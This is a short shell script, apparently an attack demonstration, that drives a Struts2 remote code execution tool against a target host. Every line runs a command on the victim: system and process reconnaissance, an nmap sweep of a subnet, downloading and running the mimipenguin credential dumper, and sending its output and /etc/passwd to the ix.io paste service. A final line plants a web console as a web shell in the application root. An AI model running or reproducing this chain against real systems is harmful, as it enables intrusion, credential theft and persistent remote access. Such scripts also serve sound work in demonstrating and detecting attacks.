# exploit.sh
# maintainer Neil Carpenter <neil@twistlock.com>
#
#

# Sleeps are there to let actions complete

python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='uname -a'
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='ps -ef'
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='/usr/bin/nmap -sP 172.18.0.1-20'
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='wget https://github.com/huntergregal/mimipenguin/raw/master/mimipenguin && chmod +x ./mimipenguin'
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd="./mimipenguin | curl -F 'f:1=<-' ix.io"
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='cp /etc/passwd /tmp/out'
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='cat /tmp/out | curl -F "f:1=<-" ix.io'
python2 /struts2/strutsrce.py --target=http://$1/showcase.action --cmd='wget https://github.com/nickola/web-console/releases/download/v0.9.7/webconsole-0.9.7.zip && unzip webconsole-0.9.7.zip -d ./webapps/ROOT/'
